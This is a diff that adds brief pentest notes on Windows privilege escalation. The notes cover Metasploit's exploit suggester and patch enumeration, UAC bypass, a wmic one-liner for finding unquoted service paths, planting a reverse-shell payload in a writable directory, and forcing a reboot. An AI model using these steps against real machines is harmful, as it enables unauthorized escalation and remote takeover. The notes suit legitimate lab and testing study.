@@ -1,0 +1,24 @@
+Types:
+
+Misconfiguration
+Kernel
+
+---------------------------------------------
+
+1. use post/multi/recon/local_exploit_suggester...
+
+2. use post/gather/enum_patches -> search for KB patches and set with a seperating comma.
+
+3. try to bypass UAC ->
+search for 'uac' in metasploit, always set technique to PSH(powershell).
+
+4. look for Unquoted Paths -> 
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+if found, go through directories and list permissions with icacls on each dir.
+Insert payload(and set to windows/shell_reverse_tcp) and BAM.
+
+# sc qc "vulnsvc" -> Query service config
+# try sc stop/start
+# shutdown /r /t 0 -> Restart endpoint to restart services aggressively
+
